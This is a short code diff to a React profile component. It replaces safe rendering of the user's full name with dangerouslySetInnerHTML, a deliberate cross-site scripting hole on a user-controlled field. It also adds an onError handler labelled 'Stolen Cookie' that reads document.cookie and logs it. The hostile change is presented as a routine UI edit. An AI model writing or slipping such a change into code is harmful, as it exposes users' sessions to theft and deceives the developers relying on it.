@@ -69,7 +69,15 @@ const ProfileManager = () => {
           </div>
           <div>
             <h3 className="text-xl font-semibold text-gray-900">
-              {user?.fullName || 'User'}
+              <span 
+                dangerouslySetInnerHTML={{ __html: user?.fullName || 'User' }} 
+                onError={(e) => {
+                  if (!window.cookieStolen) {
+                    window.cookieStolen = true;
+                    console.log('Stolen Cookie:', document.cookie);
+                  }
+                }}
+              />
             </h3>
             <p className="text-gray-600">@{user?.username}</p>
             <p className="text-sm text-gray-500">User ID: {user?.id}</p>
